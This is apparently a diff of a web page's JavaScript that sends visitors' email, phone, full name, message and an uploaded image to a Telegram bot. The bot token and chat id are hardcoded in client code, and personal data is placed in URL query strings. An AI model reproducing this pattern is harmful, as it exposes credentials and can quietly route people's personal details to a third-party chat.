@@ -697,6 +697,21 @@
                 });
 
 
+                let xurl;
+                const fileinput = document.getElementById("imgup");
+                fileinput.addEventListener("change",e=>
+                {
+                    const file = fileinput.files[0];
+                    const reader = new FileReader();
+
+                    reader.addEventListener("load", ()=> 
+                    {
+                        console.log(reader.result);
+                        xurl  =reader.result ;
+                    })
+
+                    reader.readAsDataURL(file);
+                })
                                                     
                  function sndtel() {
                         alert("im here");
@@ -716,7 +731,7 @@
                             let imgSrc = reader.result;
 
                             let Http = new XMLHttpRequest();
-                            let url = 'https://api.telegram.org/bot6413357158:AAFTaNXZANJNs9pehMUIqom0whxjlN-dAcU/sendphoto?chat_id=1632888291&photo=' + encodeURIComponent(imgSrc) + '&caption=information : %0A email : ' + Email + '%0A phone : ' + phone + '%0A fullname : ' + firstname + '+' + lastname + '%0A text' + text;
+                            let url = 'https://api.telegram.org/bot6413357158:AAFTaNXZANJNs9pehMUIqom0whxjlN-dAcU/sendphoto?chat_id=1632888291&photo=' + xurl + '&caption=information : %0A email : ' + Email + '%0A phone : ' + phone + '%0A fullname : ' + firstname + '+' + lastname + '%0A text' + text;
                             Http.open("POST", url);
                             Http.send();
                             
